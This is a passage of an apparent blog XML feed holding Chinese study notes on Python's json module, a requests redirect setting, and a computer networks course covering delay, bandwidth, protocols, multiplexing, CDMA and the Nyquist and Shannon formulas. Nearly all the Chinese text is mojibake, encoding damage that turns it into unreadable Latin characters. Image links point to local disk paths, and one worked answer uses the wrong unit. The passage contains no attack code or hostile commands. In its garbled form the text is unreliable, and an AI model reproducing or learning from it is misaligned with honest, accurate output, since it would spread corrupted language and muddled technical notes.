class="line">json.loads()å‡½æ•°å¯ä»¥å°†JSONå­—ç¬¦ä¸²è§£æä¸ºPythonå¯¹è±¡ã€‚</span><br><span class="line">json.load()å‡½æ•°å¯ä»¥ä»æ–‡ä»¶ä¸­è¯»å–JSONæ•°æ®å¹¶è§£æä¸ºPythonå¯¹è±¡ã€‚</span><br><span class="line">ç¼–ç ä¸ä¿å­˜JSONæ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line">json.dumps()å‡½æ•°å¯ä»¥å°†Pythonå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">json.dump()å‡½æ•°å¯ä»¥å°†Pythonå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼çš„å­—ç¬¦ä¸²å¹¶å†™å…¥æ–‡ä»¶ã€‚</span><br><span class="line">æ“ä½œä¸è®¿é—®JSONæ•°æ®ï¼š</span><br><span class="line"></span><br><span class="line">è§£æåçš„JSONæ•°æ®ä¼šè¢«è½¬æ¢ä¸ºç›¸åº”çš„Pythonæ•°æ®ç±»å‹ï¼Œå¦‚å­—å…¸ã€åˆ—è¡¨ç­‰ï¼Œå¯ä»¥åƒæ“ä½œæ™®é€šPythonå¯¹è±¡ä¸€æ ·å¯¹å…¶è¿›è¡Œè®¿é—®å’Œæ“ä½œã€‚</span><br><span class="line">å¤„ç†ç‰¹æ®Šæƒ…å†µï¼š</span><br><span class="line"></span><br><span class="line">json.JSONEncoderç±»å¯ä»¥è‡ªå®šä¹‰JSONç¼–ç å™¨ï¼Œä»¥å¤„ç†ç‰¹æ®Šæ•°æ®ç±»å‹æˆ–å¯¹è±¡çš„ç¼–ç ã€‚</span><br><span class="line">json.JSONDecoderç±»å¯ä»¥è‡ªå®šä¹‰JSONè§£ç å™¨ï¼Œä»¥å¤„ç†ç‰¹æ®Šçš„JSONæ•°æ®æ ¼å¼æˆ–ç‰¹å®šéœ€æ±‚ã€‚</span><br></pre></td></tr></table></figure><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = urljoin(url, path)</span><br></pre></td></tr></table></figure><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><ul><li><p>requests.exceptions.TooManyRedirects: Exceeded 30 redirects.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allow_redirects=<span class="literal">False</span></span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨.format<img src="E:/blog/source/images/image-20230824220255340.png" alt="image-20230824220255340"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">å­—ç¬¦ä¸²é‡ŒåŸæœ¬å°±æœ‰&#123;&#125;æ—¶ç”¨å…¶ä»–çš„å­—ç¬¦ä¸²æ ¼å¼åŒ–</span><br><span class="line"><span class="string">f&quot;<span class="subst">&#123;xx&#125;</span>&quot;</span></span><br><span class="line"><span class="string">f&quot;%s&quot;</span> % xx</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è®¡ç®—æœºç½‘ç»œMOOC</title>
      <link href="/2023/05/01/%E6%B9%96%E7%A7%91%E5%A4%A7mooc/"/>
      <url>/2023/05/01/%E6%B9%96%E7%A7%91%E5%A4%A7mooc/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€ç« "><a href="#ç¬¬ä¸€ç« " class="headerlink" title="ç¬¬ä¸€ç« "></a>ç¬¬ä¸€ç« </h2><h3 id="å› ç‰¹ç½‘å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µ"><a href="#å› ç‰¹ç½‘å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µ" class="headerlink" title="å› ç‰¹ç½‘å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µ"></a>å› ç‰¹ç½‘å‘å±•çš„ä¸‰ä¸ªé˜¶æ®µ</h3><img src="E:\typora img\image-20221117102953528.png" alt="image-20221117102953528" style="zoom: 67%;" /><h3 id="ISP"><a href="#ISP" class="headerlink" title="ISP"></a>ISP</h3><img src="E:\typora img\image-20221117103120389.png" alt="image-20221117103120389" style="zoom:67%;" /><h3 id="äº’è”ç½‘æ ‡å‡†åˆ¶å®š"><a href="#äº’è”ç½‘æ ‡å‡†åˆ¶å®š" class="headerlink" title="äº’è”ç½‘æ ‡å‡†åˆ¶å®š"></a>äº’è”ç½‘æ ‡å‡†åˆ¶å®š</h3><img src="E:\typora img\image-20220923193359464.png" alt="image-20220923193359464" style="zoom:67%;" /><h3 id="å¸¸ç”¨çš„æ€§èƒ½æŒ‡æ ‡"><a href="#å¸¸ç”¨çš„æ€§èƒ½æŒ‡æ ‡" class="headerlink" title="å¸¸ç”¨çš„æ€§èƒ½æŒ‡æ ‡"></a>å¸¸ç”¨çš„æ€§èƒ½æŒ‡æ ‡</h3><img src="E:\typora img\image-20220913204558578.png" alt="image-20220913204558578" style="zoom: 67%;" /><ul><li><h5 id="é€Ÿç‡"><a href="#é€Ÿç‡" class="headerlink" title="é€Ÿç‡"></a>é€Ÿç‡</h5><blockquote><p>ç°å®ç”Ÿæ´»ä¸­çš„â€œå®½å¸¦â€</p><p>å› ä¸ºISPæä¾›çš„çº¿è·¯å¸¦å®½ä½¿ç”¨çš„å•ä½æ˜¯bitï¼Œè€Œä¸€èˆ¬ä¸‹è½½è½¯ä»¶æ˜¾ç¤ºçš„æ˜¯å­—èŠ‚ï¼ˆ1å­—èŠ‚ï¼8æ¯”ç‰¹ï¼‰ï¼Œæ‰€ä»¥è¦é€šè¿‡æ¢ç®—ï¼Œæ‰èƒ½å¾—å®é™…å€¼ã€‚</p><p>ç†è®ºä¸Šï¼š2Mï¼ˆå³2Mb&#x2F;sï¼‰å®½å¸¦ç†è®ºé€Ÿç‡æ˜¯ï¼š256KB&#x2F;sï¼ˆå³2048Kb&#x2F;sï¼‰ï¼Œå®é™…é€Ÿç‡å¤§çº¦ä¸º80â€“200KB&#x2F;sï¼›</p></blockquote><p>![image-20220915093907863](E:\typora img\image-20220915093907863.png)</p></li><li><p>å¸¦å®½â€“å‘é€é€Ÿç‡ï¼Œæ•°æ®ç‡</p><p>![image-20220923193822220](E:\typora img\image-20220923193822220.png)</p></li><li><p>ååé‡</p><p>å®é™…æ•°æ®é‡</p><img src="E:\typora img\image-20220913211017777.png" alt="image-20220913211017777" style="zoom:67%;" /><img src="E:\typora img\image-20220915102810753.png" alt="image-20220915102810753" style="zoom:67%;" /></li><li><p>æ—¶å»¶</p><ul><li><p>æŒ‡æ•°æ®ï¼ˆä¸€ä¸ªæŠ¥æ–‡æˆ–åˆ†ç»„ï¼Œç”šè‡³æ¯”ç‰¹ï¼‰ä»ç½‘ç»œï¼ˆæˆ–é“¾è·¯ï¼‰çš„ä¸€ç«¯ä¼ é€åˆ°å¦ä¸€ç«¯æ‰€éœ€çš„æ—¶é—´ã€‚</p></li><li><p>ç»„æˆ</p><img src="E:\typora img\image-20220913211302189.png" alt="image-20220913211302189" style="zoom:67%;" /><img src="E:\typora img\image-20220913211405574.png" alt="image-20220913211405574" style="zoom:67%;" /><img src="E:\typora img\image-20220913211528742.png" alt="image-20220913211528742" style="zoom: 50%;" /><p>ä¿¡é“é€Ÿç‡</p><img src="E:\typora img\image-20220913211617635.png" alt="image-20220913211617635" style="zoom:50%;" /><p>æ³¨æ„:</p><blockquote><p>ä»¥ä¸‹è¯´æ³•æ˜¯é”™è¯¯çš„ï¼š<br>â€œåœ¨é«˜é€Ÿé“¾è·¯ï¼ˆæˆ–é«˜å¸¦å®½é“¾è·¯ï¼‰ä¸Šï¼Œæ¯”ç‰¹ä¼šä¼ é€å¾—æ›´å¿«äº›â€ã€‚</p></blockquote></li></ul><blockquote><p>æ€»æ—¶å»¶  &#x3D; å¤„ç†æ—¶å»¶ + æ’é˜Ÿæ—¶å»¶ + å‘é€æ—¶å»¶ + ä¼ æ’­æ—¶å»¶</p><p>ä¸Šè¿°æ–¹æ³•åªæ˜¯æé«˜äº†æ•°æ®çš„å‘é€é€Ÿç‡ï¼Œå‡å°‘äº†ä¼ æ’­æ—¶å»¶ã€‚</p></blockquote>  <img src="E:\typora img\image-20220913212738488.png" alt="image-20220913212738488" style="zoom: 67%;" /><ul><li><p>æ—¶å»¶ä¸ç½‘ç»œåˆ©ç”¨ç‡</p><img src="E:\typora img\image-20220913212835573.png" alt="image-20220913212835573" style="zoom: 67%;" /><p>ä¾‹å­ï¼šå‡å®šç½‘ç»œçš„åˆ©ç”¨ç‡è¾¾åˆ°äº†90%ã€‚è¯•ä¼°ç®—ä¸€ä¸‹ç°åœ¨çš„ç½‘ç»œæ—¶å»¶æ˜¯å®ƒçš„æœ€å°å€¼çš„å¤šå°‘å€ï¼Ÿ</p><blockquote><p>D&#x3D;D0&#x2F;(1-U)&#x3D;D0&#x2F;(1-90%)&#x3D;10D0;æ˜¯æœ€å°å€¼çš„10å€;</p><p>æ³¨ï¼šç½‘ç»œæ—¶å»¶æœ€å°å€¼ä¸ºç½‘ç»œç©ºé—²æ—¶çš„æ—¶å»¶D0</p></blockquote></li></ul></li><li><p>æ—¶å»¶å¸¦å®½ç§¯â€“é“¾è·¯ä¸Šçš„æ¯”ç‰¹æ•°ç›®</p><img src="E:\typora img\image-20220913212303725.png" alt="image-20220913212303725" style="zoom: 67%;" /></li></ul><p><strong>ç¬¬ä¸‰ç« 20.å‡å®š1kmé•¿çš„CSMA&#x2F;CDç½‘ç»œçš„æ•°æ®ç‡ä¸º1Gbit&#x2F;sã€‚è®¾ä¿¡å·åœ¨ç½‘ç»œä¸Šçš„ä¼ è¾“é€Ÿç‡ä¸º200000km&#x2F;s.æ±‚èƒ½å¤Ÿä½¿ç”¨æ­¤åè®®çš„æœ€çŸ­å¸§é•¿ã€‚</strong></p><p>ç­”ï¼šå¯¹äº1kmç”µç¼†ï¼Œå•ç¨‹ä¼ æ’­æ—¶é—´ä¸º1&#x2F;200000&#x3D;5usï¼Œæ¥å›è·¯ç¨‹ä¼ æ’­æ—¶é—´ä¸º10usï¼Œä¸ºäº†èƒ½å¤ŸæŒ‰ç…§CSMA&#x2F;CDå·¥ä½œï¼Œæœ€å°å¸§çš„å‘å°„æ—¶é—´ä¸èƒ½å°äº10usï¼Œä»¥1GB&#x2F;sé€Ÿç‡å·¥ä½œï¼Œ10uså¯ä»¥å‘é€çš„æ¯”ç‰¹æ•°ç­‰äº10*10^-6*10^9&#x3D;10^4sï¼Œå› æ­¤æœ€çŸ­å¸§æ˜¯10000ä½æˆ–1250å­—èŠ‚é•¿</p><p><strong>æœ€çŸ­å¸§é•¿ç›¸å½“äºé“¾è·¯ä¸Šçš„æ¯”ç‰¹æ•°ç›®</strong></p><ul><li><p>å¾€è¿”æ—¶é—´RTT</p><ul><li>è¡¨ç¤ºä»å‘é€æ–¹å‘é€å®Œæ•°æ®ï¼Œåˆ°å‘é€æ–¹æ”¶åˆ°æ¥è‡ªæ¥æ”¶æ–¹çš„ç¡®è®¤æ€»å…±ç»å†çš„æ—¶é—´ã€‚</li></ul><img src="E:\typora img\image-20220913212539960.png" alt="image-20220913212539960" style="zoom:67%;" /></li></ul><h3 id="åè®®ä¸æœåŠ¡"><a href="#åè®®ä¸æœåŠ¡" class="headerlink" title="åè®®ä¸æœåŠ¡"></a>åè®®ä¸æœåŠ¡</h3><img src="E:\typora img\image-20220914150912615.png" alt="image-20220914150912615" style="zoom: 67%;" /><ul><li><p>å®ä½“ (entity) ï¼šè¡¨ç¤ºä»»ä½•å¯å‘é€æˆ–æ¥æ”¶ä¿¡æ¯çš„ç¡¬ä»¶æˆ–è½¯ä»¶è¿›ç¨‹ã€‚</p><blockquote><p>æ¯”å¦‚è¯´è½¯ä»¶è¿›ç¨‹ï¼Œç½‘å¡</p></blockquote></li><li><p>åè®®ï¼šæ§åˆ¶ä¸¤ä¸ªå¯¹ç­‰å®ä½“è¿›è¡Œé€šä¿¡çš„è§„åˆ™çš„é›†åˆã€‚</p><blockquote><p>å¯¹ç­‰å®ä½“æŒ‡çš„æ˜¯åœ¨åŒä¸€å±‚ï¼ˆå¯¹ç­‰å±‚ï¼‰ä¸Šçš„å®ä½“å¦‚ä¸Šå›¾çš„Aä¸Få°±æ˜¯å¯¹ç­‰å®ä½“ã€‚</p><p>æ§åˆ¶åº”ç”¨å±‚é€šä¿¡çš„å°±æ˜¯HTPPåè®®ç­‰ã€‚</p></blockquote><ul><li><p>ä¸‰è¦ç´ </p><blockquote><p>è¯­æ³•ï¼šç¡®å®šé€šä¿¡åŒæ–¹â€å¦‚ä½•è®²â€ï¼Œå®šä¹‰äº†æ•°æ®æ ¼å¼ï¼Œç¼–ç å’Œä¿¡å·ç”µå¹³ç­‰ã€‚</p><p>è¯­ä¹‰ï¼šç¡®å®šé€šä¿¡åŒæ–¹â€è®²ä»€ä¹ˆâ€ï¼Œå®šä¹‰äº†ç”¨äºåè°ƒåŒæ­¥å’Œå·®é”™å¤„ç†ç­‰æ§åˆ¶ä¿¡æ¯ã€‚</p><p>åŒæ­¥ï¼šç¡®å®šé€šä¿¡åŒæ–¹â€è®²è¯çš„æ¬¡åºâ€ï¼Œå®šä¹‰äº†é€Ÿåº¦åŒ¹é…å’Œæ’åºç­‰ã€‚</p></blockquote></li><li><p>åè®®ä¸æœåŠ¡</p><img src="E:\typora img\image-20220914153141106.png" alt="image-20220914153141106" style="zoom:67%;" /><blockquote><p>äºŒè€…æ˜¯ç›¸äº’ä¾å­˜çš„ã€‚ï¼ˆæ³¨æ„æœ€åº•å±‚ç‰©ç†å±‚çš„ä¸åŒä¹‹å¤„ã€‚ï¼‰</p><p>è¦å®ç°æœ¬å±‚åè®®ï¼Œéœ€è¦ä½¿ç”¨ä¸‹å±‚æ‰€æä¾›çš„æœåŠ¡ï¼ˆé€šè¿‡æœåŠ¡åŸè¯­è·å¾—ï¼‰</p><p>åœ¨åè®®çš„æ§åˆ¶ä¸‹ï¼Œä¸¤ä¸ªå¯¹ç­‰å®ä½“é—´çš„é€šä¿¡ä½¿å¾—æœ¬å±‚èƒ½å¤Ÿå‘ä¸Šä¸€å±‚æä¾›æœåŠ¡ã€‚</p></blockquote><p>æ‰€ä»¥åè®®æ˜¯â€œæ°´å¹³çš„â€ï¼ŒæœåŠ¡æ˜¯â€œå‚ç›´çš„â€ï¼Œå®ä½“çœ‹å¾—è§ç›¸é‚»ä¸‹å±‚æ‰€æä¾›çš„æœåŠ¡ï¼Œä½†å¹¶ä¸çŸ¥é“å®ç°è¯¥æœåŠ¡çš„å…·ä½“åè®®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸‹é¢çš„åè®®å¯¹ä¸Šé¢çš„å®ä½“æ˜¯â€é€æ˜â€çš„ã€‚</p></li></ul></li><li><p>SDU</p><blockquote><p>å±‚ä¸å±‚ä¹‹é—´äº¤æ¢çš„æ•°æ®çš„å•ä½ç§°ä¸º<strong>æœåŠ¡æ•°æ®å•å…ƒ</strong> SDU </p></blockquote></li><li><p>PDU</p><blockquote><p>å¯¹ç­‰å±‚æ¬¡ä¹‹é—´ä¼ é€çš„æ•°æ®åŒ…ç§°ä¸ºè¯¥å±‚çš„<strong>åè®®æ•°æ®å•å…ƒ</strong>ã€‚</p></blockquote></li><li><p>æœåŠ¡è®¿é—®ç‚¹</p><blockquote><p>åœ¨åŒä¸€ç³»ç»Ÿä¸­ç›¸é‚»ä¸¤å±‚çš„å®ä½“äº¤æ¢ä¿¡æ¯çš„é€»è¾‘æ¥å£ï¼Œç”¨äºåŒºåˆ†ä¸åŒçš„æœåŠ¡ç±»å‹ã€‚</p></blockquote><ul><li>æ•°æ®é“¾è·¯å±‚çš„æœåŠ¡è®¿é—®ç‚¹ä¸ºå¸§çš„â€œç±»å‹â€å­—æ®µã€‚</li><li>ç½‘ç»œå±‚çš„æœåŠ¡è®¿é—®ç‚¹ä¸ºIPæ•°æ®æŠ¥é¦–éƒ¨ä¸­çš„â€œåè®®å­—æ®µâ€ã€‚è¿è¾“å±‚çš„æœåŠ¡è®¿é—®ç‚¹ä¸ºâ€œç«¯å£å·â€ã€‚</li></ul></li></ul><h3 id="è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„"><a href="#è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„" class="headerlink" title="è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„"></a>è®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„</h3><p><img src="/../images/image-20231006153941570.png" alt="image-20231006153941570"></p><p><img src="/../images/image-20231006154014303.png" alt="image-20231006154014303"></p><img src="E:\typora img\image-20220914162928366.png" alt="image-20220914162928366" style="zoom: 50%;" /><h3 id="å¤ç”¨å’Œåˆ†ç”¨"><a href="#å¤ç”¨å’Œåˆ†ç”¨" class="headerlink" title="å¤ç”¨å’Œåˆ†ç”¨"></a>å¤ç”¨å’Œåˆ†ç”¨</h3><blockquote><p>ä¸€èˆ¬æ¥è¯´ï¼Œåº”ç”¨å±‚ä¼šæœ‰æ¯”è¾ƒå¤šçš„è¿›ç¨‹åŒæ—¶åœ¨è¿è¡Œï¼ŒåŒæ—¶å’Œå¤–éƒ¨ç½‘ç»œæœ‰æ•°æ®çš„äº¤äº’ï¼Œå°±å¥½æ¯”ä¸€æ¡é“è·¯æœ‰å¤šä¸ªè½¦é“æœ‰è½¦è¾†åœ¨è¡Œé©¶ã€‚</p><p>å¯æ˜¯åœ¨åº•å±‚ï¼Œæ•°æ®ä¼ è¾“æ˜¯ä¸²è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯å•è½¦é“ã€‚</p><p>å½“å¤šè½¦é“çš„è½¦è¦ç»è¿‡å•è½¦é“ï¼Œé‡‡å–çš„æ–¹æ³•æ˜¯åœ¨å•è½¦é“å…¥å£è®¾ç«‹å¡å­ï¼Œæ¯ä¸ªè½¦é“çš„è½¦åœ¨å¡å­å‰æ’é˜Ÿï¼Œä¾æ¬¡é€šè¿‡å¡å­è¿›å…¥å•è½¦é“ã€‚</p><p>æ’é˜Ÿçš„è¿‡ç¨‹å°±æ˜¯å¤ç”¨ï¼ˆå¤š â†’ ä¸€ï¼‰ï¼Œåä¹‹å°±æ˜¯åˆ†ç”¨æˆ–è€…å«è§£å¤ç”¨ï¼ˆä¸€ â†’ å¤šï¼‰</p></blockquote><h2 id="ç¬¬äºŒç« "><a href="#ç¬¬äºŒç« " class="headerlink" title="ç¬¬äºŒç« "></a>ç¬¬äºŒç« </h2><h4 id="ç‰©ç†å±‚åŸºæœ¬æ¦‚å¿µ"><a href="#ç‰©ç†å±‚åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="ç‰©ç†å±‚åŸºæœ¬æ¦‚å¿µ"></a>ç‰©ç†å±‚åŸºæœ¬æ¦‚å¿µ</h4><ul><li><p>ä½œç”¨</p><blockquote><p>åœ¨è¿æ¥å„ç§è®¡ç®—æœºçš„ä¼ è¾“åª’ä½“ä¸Šä¼ è¾“æ•°æ®æ¯”ç‰¹æµã€‚</p><p>æ³¨æ„ï¼šä¼ è¾“åª’ä½“ä¸å±äºè®¡ç®—æœºç½‘ç»œä½“ç³»ç»“æ„ï¼ˆç½‘ç»œä½“ç³»ç»“æ„ï¼šç½‘ç»œå„å±‚åŠå…¶åè®®çš„é›†åˆï¼‰ï¼Œç›¸å½“äºç¬¬0å±‚å³ç‰©ç†å±‚çš„ä¸‹ä¸€å±‚ã€‚</p></blockquote></li><li><p>ç‰¹ç‚¹</p><ul><li><p>æœºæ¢°ç‰¹æ€§</p><blockquote><p>æŒ‡æ˜ä¼ è¾“åª’ä½“çš„å„ç§è§„æ ¼</p></blockquote></li><li><p>ç”µæ°”ç‰¹æ€§</p><blockquote><p>æŒ‡æ˜æ¥å£ç”µç¼†ä¸Šçš„ç”µå‹èŒƒå›´</p></blockquote></li><li><p>åŠŸèƒ½ç‰¹æ€§</p><blockquote><p>æŒ‡æ˜æ¥å£ç”µç¼†å„æ¡ä¿¡å·çº¿ï¼ˆç”µå‹èŒƒå›´ï¼‰çš„ä½œç”¨</p></blockquote></li><li><p>è¿‡ç¨‹ç‰¹æ€§</p><blockquote><p>æŒ‡æ˜æ¯ç§åŠŸèƒ½çš„äº‹ä»¶å‘ç”Ÿé¡ºåº</p></blockquote></li></ul></li></ul><h4 id="ä¼ è¾“åª’ä½“çš„ç§ç±»"><a href="#ä¼ è¾“åª’ä½“çš„ç§ç±»" class="headerlink" title="ä¼ è¾“åª’ä½“çš„ç§ç±»"></a>ä¼ è¾“åª’ä½“çš„ç§ç±»</h4><img src="E:\typora img\image-20220918102206140.png" alt="image-20220918102206140" style="zoom: 67%;" /><h4 id="ä¿¡é“å¤ç”¨æŠ€æœ¯"><a href="#ä¿¡é“å¤ç”¨æŠ€æœ¯" class="headerlink" title="ä¿¡é“å¤ç”¨æŠ€æœ¯"></a>ä¿¡é“å¤ç”¨æŠ€æœ¯</h4><p>ç›®çš„ï¼š</p><blockquote><p>ä¸ºäº†é€šè¿‡å…±äº«ä¿¡é“,æœ€å¤§é™åº¦æé«˜ä¿¡é“åˆ©ç”¨ç‡ã€‚</p></blockquote><ul><li><p>é¢‘åˆ†å¤ç”¨</p><blockquote><p>ç”¨æˆ·<strong>åŒæ—¶</strong>å ç”¨<strong>ä¸åŒçš„é¢‘å¸¦</strong>èµ„æºå¹¶è¡Œé€šä¿¡</p></blockquote></li><li><p>æ—¶åˆ†å¤ç”¨</p><blockquote><p>ç”¨æˆ·<strong>åˆ†æ—¶</strong>å ç”¨<strong>ç›¸åŒçš„é¢‘å¸¦</strong>èµ„æºå¹¶è¡Œé€šä¿¡</p></blockquote></li><li><p>æ³¢åˆ†å¤ç”¨</p><blockquote><p>ä¸é¢‘åˆ†å¤ç”¨ä¸€æ ·ï¼Œåªæ˜¯ä¼ è¾“æ•°æ®çš„<strong>ä»‹è´¨å˜ä¸ºå…‰æ³¢</strong></p></blockquote></li><li><p>ç åˆ†å¤ç”¨</p><blockquote><p>ç”¨æˆ·<strong>åŒæ—¶</strong>å ç”¨<strong>ç›¸åŒçš„é¢‘å¸¦</strong>è¿›è¡Œé€šä¿¡</p></blockquote><ul><li><p>ç ç‰‡ï¼šæ¯ä¸ªæ¯”ç‰¹æ—¶é—´åˆ’åˆ†ä¸ºmä¸ªæ›´çŸ­çš„æ—¶é—´ç‰‡ï¼Œç§°ä¸ºç ç‰‡ï¼ˆChipï¼‰</p><blockquote><p>æŸä¸ªç«™è¦å‘é€æ¯”ç‰¹1ï¼Œåˆ™å‘é€å®ƒè‡ªå·±çš„mæ¯”ç‰¹ç ç‰‡åºåˆ—</p><p>æŸä¸ªç«™è¦å‘é€æ¯”ç‰¹0ï¼Œåˆ™å‘é€å®ƒè‡ªå·±çš„mæ¯”ç‰¹ç ç‰‡åºåˆ—çš„åç ã€‚</p></blockquote></li><li><p>ç ç‰‡å‘é‡</p><blockquote><p>æ ¹æ®ç ç‰‡åºåˆ—ç”Ÿæˆã€‚1â†’1ï¼Œ0â†’-1</p><p>å‡è®¾ç ç‰‡åºåˆ—ä¸º110</p><p>åˆ™ç ç‰‡å‘é‡ä¸ºï¼ˆ1ï¼Œ1ï¼Œ-1ï¼‰</p></blockquote></li><li><p>è§„æ ¼åŒ–å†…ç§¯</p><img src="E:\typora img\image-20220920111446605.png" alt="image-20220920111446605" style="zoom: 67%;" /><blockquote><p>å³å¼ä¸­çš„Aiï¼ŒBiæŒ‡çš„æ˜¯ç ç‰‡å‘é‡</p></blockquote><p>![image-20220920111732057](E:\typora img\image-20220920111732057.png)</p><p>ç”Ÿæ´»ä¸­çš„ä¾‹å­</p><img src="E:\typora img\image-20220920111832249.png" alt="image-20220920111832249" style="zoom:67%;" /><img src="E:\typora img\image-20220920111905155.png" alt="image-20220920111905155" style="zoom:50%;" /></li></ul><p>è§„æ ¼åŒ–å†…ç§¯å¾—åˆ°ï¼ˆ1ï¼Œ-1ï¼Œ1ï¼‰å¯¹åº”çš„ç ç‰‡åºåˆ—å°±æ˜¯101ï¼Œå³æ‰‹æœºAæ”¶åˆ°æ¯”ç‰¹ä¸²101.</p></li></ul><h4 id="ç å…ƒç‡ä¸æ•°æ®ç‡"><a href="#ç å…ƒç‡ä¸æ•°æ®ç‡" class="headerlink" title="ç å…ƒç‡ä¸æ•°æ®ç‡"></a>ç å…ƒç‡ä¸æ•°æ®ç‡</h4><p>å¥ˆå¼å‡†åˆ™å¾—åˆ°æœ€é«˜ç å…ƒé€Ÿç‡ï¼ˆæ³¢ç‰¹ç‡ï¼‰ä¸º20000ç å…ƒ&#x2F;ç§’ï¼Œç å…ƒçš„æŒ¯å¹…åˆ†ä¸º16ä¸ªç­‰çº§ï¼Œå³ä¿¡å·çŠ¶æ€æ•°ï¼ˆå¯è°ƒåˆ¶å‡ºçš„ä¸åŒåŸºæœ¬æ³¢å½¢æˆ–ç å…ƒæ•°é‡ï¼‰ä¸º16ï¼Œåˆ™ä¸€ä¸ªç å…ƒå¯æºå¸¦çš„æ¯”ç‰¹æ•°é‡ä¸ºlog216&#x3D;4ï¼Œæ‰€ä»¥æœ€é«˜æ•°æ®ç‡ä¸º20000*4æ¯”ç‰¹&#x2F;ç§’ã€‚</p><img src="E:\typora img\image-20221120194830348.png" alt="image-20221120194830348" style="zoom:67%;" /><h4 id="å¥ˆå¼å‡†åˆ™å’Œé¦™å†œå…¬å¼"><a href="#å¥ˆå¼å‡†åˆ™å’Œé¦™å†œå…¬å¼" class="headerlink" title="å¥ˆå¼å‡†åˆ™å’Œé¦™å†œå…¬å¼"></a>å¥ˆå¼å‡†åˆ™å’Œé¦™å†œå…¬å¼</h4><p>![image-20220920112420614](E:\typora img\image-20220920112420614.png)</p><h5 id="è®¡ç®—"><a href="#è®¡ç®—" class="headerlink" title="è®¡ç®—"></a>è®¡ç®—</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æé™ä¿¡æ¯ä¼ è¾“é€Ÿç‡==ç å…ƒä¼ è¾“é€Ÿç‡ï¼ˆæ³¢ç‰¹ç‡ï¼‰*ç å…ƒæºå¸¦çš„æ¯”ç‰¹æ•°</span><br><span class="line">ç å…ƒæºå¸¦çš„æ¯”ç‰¹æ•°ï¼š1og2n //nä¸ºç å…ƒçš„æŒ¯å¹…æˆ–è€…ä¿¡å·çŠ¶æ€æ•°ï¼ˆå¯è°ƒåˆ¶å‡ºçš„ä¸åŒåŸºæœ¬æ³¢å½¢æˆ–ç å…ƒæ•°é‡ï¼‰</span><br><span class="line">é¢‘ç‡ï¼ä¼ æ’­é€Ÿç‡/æ³¢é•¿</span><br><span class="line">é¢‘å¸¦å®½åº¦=æœ€é«˜é¢‘ç‡-æœ€ä½é¢‘ç‡</span><br></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰ç« 16.æ•°æ®ç‡ä¸º10Mb&#x2F;sçš„ä»¥å¤ªç½‘åœ¨ç‰©ç†åª’ä½“ä¸Šçš„ç å…ƒä¼ è¾“é€Ÿç‡æ˜¯å¤šå°‘ç å…ƒ&#x2F;ç§’ï¼Ÿ</strong><br>ç­”ï¼šç å…ƒä¼ è¾“é€Ÿç‡å³ä¸ºæ³¢ç‰¹ç‡ï¼Œä»¥å¤ªç½‘ä½¿ç”¨æ›¼å½»æ–¯ç‰¹ç¼–ç ï¼Œè¿™å°±æ„å‘³ç€å‘é€çš„æ¯ä¸€ä½éƒ½æœ‰ä¸¤ä¸ªä¿¡å·å‘¨æœŸï¼ˆä¸€ä¸ªç å…ƒæºå¸¦0.5ä¸ªæ¯”ç‰¹ï¼‰ï¼Œå› æ­¤æ³¢ç‰¹ç‡æ˜¯æ•°æ®ç‡çš„ä¸¤å€ï¼Œå³20Mç å…ƒ&#x2F;ç§’</p><h2 id="ç¬¬ä¸‰ç« "><a href="#ç¬¬ä¸‰ç« " class="headerlink" title="ç¬¬ä¸‰ç« "></a>ç¬¬ä¸‰ç« </h2><h3 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h3><h5 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h5><img src="E:\typora img\image-20221121103738315.png" alt="image-20221121103738315" style="zoom:80%;" /><p><strong>æ•°æ®é“¾è·¯å±‚åšæˆå¯é çš„é“¾è·¯å±‚æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚</strong></p><blockquote><p>å¯é çš„é“¾è·¯å±‚çš„ä¼˜ç‚¹å’Œç¼ºç‚¹å–å†³äºæ‰€åº”ç”¨çš„ç¯å¢ƒï¼šå¯¹äºå¹²æ‰°ä¸¥é‡çš„ä¿¡é“ï¼Œå¯é çš„é“¾è·¯å±‚å¯ä»¥å°†é‡ä¼ èŒƒå›´çº¦æŸåœ¨å±€éƒ¨é“¾è·¯ï¼Œé˜²æ­¢å…¨ç½‘ç»œçš„ä¼ è¾“æ•ˆç‡å—æŸï¼›å¯¹äºä¼˜è´¨ä¿¡é“ï¼Œé‡‡ç”¨å¯é çš„é“¾è·¯å±‚ä¼šå¢å¤§èµ„æºå¼€é”€ï¼Œå½±å“ä¼ è¾“æ•ˆç‡ã€‚</p></blockquote><ul><li><p>é€æ˜ä¼ è¾“</p><ul><li><p>æ·»åŠ 